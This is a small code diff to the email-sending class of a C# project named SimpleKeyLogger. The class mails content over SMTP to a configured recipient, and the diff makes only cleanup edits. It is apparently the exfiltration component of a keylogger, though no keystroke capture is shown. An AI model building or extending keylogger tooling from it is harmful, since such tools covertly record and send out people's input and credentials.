@@ -1,8 +1,5 @@
 ﻿using SimpleKeyLogger.Models;
-using System;
-using System.Collections.Generic;
 using System.ComponentModel;
-using System.Linq;
 using System.Net;
 using System.Net.Mail;
 using System.Text;
@@ -25,7 +22,6 @@ namespace SimpleKeyLogger.EmailSender
 
         public LoggerEmailSender(AppConfig appConfig)
         {
-            
             _hostSmpt = appConfig.ServerConfiguration.HostSmtp;
             _enableSsl = appConfig.ServerConfiguration.EnableSsl;
             _port = appConfig.ServerConfiguration.Port;
@@ -33,7 +29,6 @@ namespace SimpleKeyLogger.EmailSender
             _senderEmailPassword = appConfig.SenderConfiguration.SenderPassword;
             _senderName = appConfig.SenderConfiguration.SenderName;
             _recipientEmail = appConfig.RecipientEmail;
-
         }
         public async Task SendAsync(string subject, string body)
         {
@@ -54,13 +49,13 @@ namespace SimpleKeyLogger.EmailSender
                 UseDefaultCredentials = false,
                 Credentials = new NetworkCredential(_senderEmail, _senderEmailPassword)
             };
+
             _smtp.SendCompleted += OnSendCompleted;
             await _smtp.SendMailAsync(_mail);
         }
 
         private void OnSendCompleted(object sender, AsyncCompletedEventArgs e)
         {
-            _smtp.Dispose();
             _smtp.Dispose();
         }
     }
